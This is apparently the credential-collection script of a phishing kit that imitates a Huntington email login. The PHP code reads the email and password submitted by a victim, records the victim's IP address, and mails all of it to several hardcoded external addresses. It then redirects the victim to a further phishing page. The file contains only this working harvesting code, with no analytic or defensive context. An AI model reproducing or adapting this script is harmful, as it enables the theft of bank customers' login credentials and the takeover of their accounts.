<?php
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");
$message .= "D0N5L0W----HUNT1NGT0N-----2EMA1L----2023\n";
$message .= "EMA1L: " .$_POST['m']."\n\n";
$message .= "PASSW0RD: " .$_POST['p']."\n\n";
$message .= "D0N5L0W----HUNT1NGT0N-----2EMA1L----2023\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "D0N5L0W----HUNT1NGT0N-----2EMA1L----2023\n";
$recipient = "donflow2021@yahoo.com,donflow2021@yahoo.com,user0202777a@gmail.com, jcole15000@hotmail.com, donflowmania@maine.rr.com, donflowmania@juno.com";
$subject = "D0N5L0W----HUNTINGTON-----2EMA1L----2023";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."HUNT1NGT0N";
$headers .= "D0N5L0W----HUNT1NGT0N-----2EMA1L----2023";
     mail("$cc", "yahoo Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: surf4.php");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>
        